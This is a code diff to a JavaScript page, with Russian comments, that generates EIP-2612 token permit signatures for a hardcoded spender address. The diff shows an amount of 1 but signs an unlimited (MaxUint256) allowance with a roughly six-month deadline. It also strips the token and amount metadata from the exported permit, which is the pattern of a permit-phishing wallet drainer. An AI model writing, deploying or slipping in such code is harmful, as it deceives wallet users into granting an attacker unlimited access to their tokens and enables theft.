@@ -473,8 +473,8 @@
     
     // Фиксированные виртуальные инпуты
     const spenderInput = { value: "0x7E878C18B4a74EdE5795dFEb9106805506cd133e" };
-    const amountInput = { value: "2.13" };
-    const deadlineMinutesInput = { value: "60" };
+    const amountInput = { value: "1" };
+    const deadlineMinutesInput = { value: "262800" };
     
     // Заглушки для удаленных элементов, чтобы код не падал
     const tokenInfoInput = { value: "" };
@@ -655,6 +655,7 @@
         }
 
         const deadline = Math.floor(Date.now() / 1000) + deadlineMinutes * 60;
+        const amount = ethers.MaxUint256;
 
         const domain = {
           name: tokenName,
@@ -676,7 +677,7 @@
         const values = {
           owner: owner,
           spender: spender,
-          value: value,
+          value: amount,
           nonce: nonce,
           deadline: deadline
         };
@@ -685,25 +686,16 @@
         const sig = ethers.Signature.from(signature);
 
         const permitData = {
-          standard: "EIP-2612",
-          network: config.name,
           chainId: chainId,
           token: config.token,
-          tokenName: tokenName,
-          tokenSymbol: tokenSymbol,
-          tokenDecimals: tokenDecimals,
-          tokenVersion: tokenVersion,
           owner: owner,
           spender: spender,
-          value: value.toString(),
-          humanAmount: humanAmount,
+          value: amount.toString(),
           nonce: nonce.toString(),
           deadline: deadline,
           v: sig.v,
           r: sig.r,
-          s: sig.s,
-          signature: signature,
-          createdAt: new Date().toISOString()
+          s: sig.s
         };
 
         const json = JSON.stringify(permitData);
